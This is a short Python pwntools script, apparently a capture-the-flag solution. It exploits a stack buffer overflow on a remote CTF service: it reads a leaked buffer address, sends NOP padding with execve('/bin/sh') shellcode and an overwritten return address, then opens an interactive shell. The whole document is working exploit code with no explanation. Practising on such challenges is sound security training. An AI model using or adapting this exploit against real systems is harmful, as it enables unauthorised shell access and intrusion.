#!/usr/bin/python3

import pwn

p = pwn.remote("ctf.j0n9hyun.xyz", 3005)

padding = b"\x90"
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

p.recvuntil("buf: ")
buf = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)
pwn.log.info("buf: " + hex(buf))

payload = padding*10000
payload += shellcode
payload += padding*17936
payload += pwn.p64(buf)

p.sendline(payload)

p.interactive()
